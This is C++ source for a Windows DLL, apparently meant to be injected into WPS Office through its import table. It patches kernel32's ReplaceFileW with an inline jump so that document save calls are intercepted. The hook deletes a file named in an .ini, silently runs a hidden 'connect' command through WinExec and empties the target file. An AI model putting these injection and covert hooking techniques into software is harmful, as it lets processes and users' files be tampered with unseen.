// word dll.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include <tlhelp32.h>
#include <WINDOWS.H>
#include <stdio.h>
#include <TCHAR.H>
#include <stdlib.h>
#pragma pack(1)
DWORD* lpAddr;
PROC OldProc = (PROC)ReplaceFileW;
HINSTANCE g_hInstance = NULL; 
HHOOK  g_hHook = NULL; 
DWORD newReplace=0;
DWORD random=0;

DWORD dllsign=0;
//////////////////////////////////////////////////////////////////////////////////////
BOOL MByteToWChar(LPCSTR lpcszStr, LPWSTR lpwszStr, DWORD dwSize)
  {
    // Get the required size of the buffer that receives the Unicode 
    // string. 
    DWORD dwMinSize;
    dwMinSize = MultiByteToWideChar (CP_ACP, 0, lpcszStr, -1, NULL, 0);
  
    if(dwSize < dwMinSize)
    {
     return FALSE;
    }
  
    
    // Convert headers from ASCII to Unicode.
    MultiByteToWideChar (CP_ACP, 0, lpcszStr, -1, lpwszStr, dwMinSize);  
    return TRUE;
  }
BOOL WCharToMByte(LPCWSTR lpcwszStr, LPSTR lpszStr, DWORD dwSize)
  {
   DWORD dwMinSize;
   dwMinSize = WideCharToMultiByte(CP_OEMCP,NULL,lpcwszStr,-1,NULL,0,NULL,FALSE);
   if(dwSize < dwMinSize)
   {
    return FALSE;
   }
   WideCharToMultiByte(CP_OEMCP,NULL,lpcwszStr,-1,lpszStr,dwSize,NULL,FALSE);
   return TRUE;
  }
/////////////////////////////////////////////////////////////////////////////////////////
typedef struct _JMPCODE
{
    BYTE jmp;
    DWORD addr;
}JMPCODE,*PJMPCODE;

void __cdecl GetText(TCHAR *filename,TCHAR *filename2)
{ 
	DWORD randomnow=0;
    TCHAR a[255];
	int info=0;
	TCHAR b[255];
	TCHAR path1[MAX_PATH];
	TCHAR fullpath[MAX_PATH];
	char temp[20];
	char finalpath[MAX_PATH];
	char filename21[MAX_PATH];

	randomnow=GetTickCount();

	lstrcpyW(a,filename);
	lstrcat(a,_T(".ini"));

	itoa(randomnow,temp,10);
	MByteToWChar(temp,b,sizeof(b)/sizeof(b[0]));

	info=GetPrivateProfileString(_T("docinfo"),_T("path"),_T(""),path1,sizeof(path1),a);
	DeleteFile(path1);
	WritePrivateProfileString(_T("wordinfo"),_T("sign"),b,path1);
	
	wsprintf(fullpath,_T("connect 0 %s %d"),filename2,randomnow);
	WCharToMByte(fullpath,finalpath,sizeof(finalpath)/sizeof(finalpath[0]));
	WCharToMByte(filename2,filename21,sizeof(filename21)/sizeof(filename21[0]));
	WinExec(finalpath,SW_HIDE);
	FILE *fp=fopen(filename21,"wb");
	fclose(fp);
	WritePrivateProfileString(_T("wordinfo"),_T("sign"),b,filename2);

//	MessageBoxW(0, fullpath, 0, MB_OK);
//	MessageBoxW(0, filename, 0, MB_OK);
}

__declspec(naked) VOID MyReplaceFileW(VOID)
{
	__asm
	{
		
	    pushad                            //全寄存器入栈保护现场
			push	DWORD PTR[ebp+0xc]    
			push	DWORD PTR[ebp+0x8]    //ReplaceFileW的两个参数入栈
			call	GetText               //截获参数函数
			add esp,8                     //手动平衡栈区  
		popad                             //恢复现场  
			
		    push 0x348                        //修复jmp覆盖掉的指令
		    jmp newReplace                    //返回原函数继续执行
	}
}

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{	
	HANDLE h= 
		GetProcAddress(LoadLibraryA("kernel32.dll"),"ReplaceFileW");
	
	g_hInstance = (HINSTANCE)hModule;
	
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		
		
		if(dllsign==0)
		{
			dllsign=1;
			random=GetTickCount();
			JMPCODE jcode;
			jcode.jmp = 0xE9;
			jcode.addr = (DWORD)MyReplaceFileW - (DWORD)h - 5;
			WriteProcessMemory(GetCurrentProcess(),(void*)h,&jcode,sizeof(JMPCODE),NULL);
			newReplace=(DWORD)h+0x5;
		}
		break;
	case DLL_PROCESS_DETACH:
		
		
		break;
	}
    return TRUE;
}




extern "C" __declspec(dllexport) int TestFunction()//为了给wps加入输入表用
{
   return 0;
}

















